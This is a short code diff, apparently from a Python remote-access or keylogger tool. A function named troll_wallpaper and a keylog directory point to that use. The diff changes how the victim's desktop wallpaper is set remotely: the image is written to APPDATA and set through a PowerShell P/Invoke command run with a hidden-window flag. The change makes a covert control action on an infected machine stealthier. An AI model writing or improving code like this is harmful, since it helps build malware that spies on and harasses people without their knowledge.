@@ -3323,7 +3323,7 @@ def troll_wallpaper():
         raw_path = os.path.join(KEYLOG_DIR, "_wallpaper_raw")
         with open(raw_path, 'wb') as f:
             f.write(img_data)
-        bmp_path = os.path.join(KEYLOG_DIR, "_wallpaper.bmp")
+        bmp_path = os.path.join(os.environ.get('APPDATA', ''), "igr_wallpaper.bmp")
         try:
             from PIL import Image
             img = Image.open(raw_path)
@@ -3336,8 +3336,17 @@ def troll_wallpaper():
             os.remove(raw_path)
         except:
             pass
-        import ctypes
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, bmp_path, 3)
+        abs_bmp = os.path.abspath(bmp_path)
+        try:
+            ps_cmd = (
+                f'Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class WP{{[DllImport(\\"user32.dll\\",CharSet=CharSet.Unicode)]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);}}";'
+                f'[WP]::SystemParametersInfo(20,0,\\"{abs_bmp}\\",3)'
+            )
+            subprocess.run(['powershell', '-Command', ps_cmd],
+                capture_output=True, timeout=15, creationflags=0x08000000)
+        except:
+            import ctypes
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_bmp, 3)
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
